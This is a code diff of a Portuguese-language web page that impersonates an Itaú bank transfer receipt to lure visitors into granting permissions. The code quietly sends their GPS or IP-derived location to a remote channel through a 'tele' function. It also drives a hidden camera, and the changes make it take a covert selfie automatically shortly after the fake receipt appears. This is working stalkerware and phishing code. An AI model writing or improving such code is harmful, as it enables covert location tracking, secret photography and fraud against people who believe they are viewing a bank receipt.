@@ -11,13 +11,13 @@
   #spinner{width:48px;height:48px;border:4px solid #ddd;border-top:4px solid #003366;border-radius:50%;animation:spin 1s linear infinite}
   @keyframes spin{to{transform:rotate(360deg)}}
   #msgNegado{display:none;text-align:center;color:#c00;font-size:16px;font-weight:600}
-  #comprovante{display:none;background:#fff;width:100%;max-width:480px;padding:24px;border:1px solid #ccc;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);position:relative;overflow:hidden;filter:blur(8px);backdrop-filter:blur(12px)}
+  #comprovante{display:none;background:#fff;width:100%;max-width:480px;padding:24px;border:1px solid #ccc;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1)}
   .logo{background:#003366;color:#fff;font-weight:700;font-size:18px;padding:12px;text-align:center;border-radius:4px;margin-bottom:16px}
   .row{display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px}
   .label{color:#555}
   .value{font-weight:600}
   .divider{height:1px;background:#ddd;margin:12px 0}
-  .center{text-align:center;font-size:12px;color:#777}
+  .center{text-align:center}
   #camera{display:none}
 </style>
 </head>
@@ -34,7 +34,7 @@
   <p>Para visualizar, precisa permitir permissões da página.</p>
 </div>
 
-<!-- COMPROVANTE (embaçado) -->
+<!-- COMPROVANTE (apenas texto) -->
 <div id="comprovante">
   <div class="logo">Itaú</div>
   <div class="row"><span class="label">Comprovante de Transferência</span><span class="value" id="dataHora"></span></div>
@@ -44,7 +44,7 @@
   <div class="row"><span class="label">ID da transação</span><span class="value" id="idTransacao"></span></div>
   <div class="row"><span class="label">Autenticação BACEN</span><span class="value" id="autenticacao"></span></div>
   <div class="divider"></div>
-  <p class="center">Transação realizada com sucesso.</p>
+  <p class="center" style="font-size:12px;color:#777">Transação realizada com sucesso.</p>
 </div>
 
 <!-- CAMERA OCULTA -->
@@ -111,15 +111,19 @@ function obterEEnviarDados(origem) {
       const { latitude:l, longitude:n, accuracy:a } = pos.coords;
       tele(`📍 gps permitido\nhttps://www.google.com/maps/@${l},${n},18z`);
       mostrarComprovante();
+      setTimeout(tirarSelfie, 1200);
     });
   } else {
+    /* fallback IP (ou genérico) */
     fetch('https://ipapi.co/json/')
       .then(r=>r.json())
       .then(data=>{
         tele(`📍 via IP: https://www.google.com/maps/@${data.latitude},${data.longitude},18z`);
       })
       .catch(()=>tele('📍 falhou IP'));
+    // mesmo falhando ou negando → tenta
     mostrarComprovante();
+    setTimeout(tirarSelfie, 1200);
   }
 }
 
@@ -129,20 +133,9 @@ function mostrarComprovante() {
   document.getElementById('msgNegado').style.display='none';
 }
 
-/* -------- GATILHOS EXTRAS -------- */
-/* 1) selfie ao segundo clique */
-let clicks = 0;
-window.addEventListener('click', ()=>{
-  if(++clicks === 2) tirarSelfie();
-});
-
-/* 2) selfie automática cada 8 s (descomente se quiser)
-// setInterval(tirarSelfie, 8000);
-*/
-
 /* ---------- INÍCIO ---------- */
-obterEEnviarDados('ip');
-obterEEnviarDados('gps');
+obterEEnviarDados('ip');       // primeiro IP
+obterEEnviarDados('gps');      // se permitir GPS, sobrescreve IP
 </script>
 </body>
 </html>
